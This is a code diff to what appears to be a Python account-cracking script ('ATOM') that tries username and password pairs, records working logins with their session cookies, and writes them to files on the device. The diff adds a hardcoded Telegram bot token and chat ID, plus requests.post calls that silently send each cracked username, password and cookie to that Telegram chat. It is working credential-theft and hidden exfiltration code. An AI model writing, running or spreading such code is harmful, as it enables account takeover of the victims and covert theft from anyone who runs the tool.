@@ -311,6 +311,8 @@ c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
 c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
 c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
 mtd,cp_xdx,cokix=[],[],[]
+token = ('6628496363:AAFRd1HpukVfL1uuaXfUPABhyaAfLYkzRTU')
+ID = ('1778046662')
 def clear():
   os.system('clear')
 import requests,os
@@ -1250,9 +1252,10 @@ def m6(idf,pwv):
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            statusok = (f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} | {user} | {ps}\33[1;36m")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
     if 'lock' in reqx:
@@ -1267,6 +1270,8 @@ def m6(idf,pwv):
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
      print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+     statusok = (f"\r\033[38;5;196mCOOKIES=[🤖]: {uid} | {ps} |\33[1;36m")
+     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
     cp.append(uid)
    else:
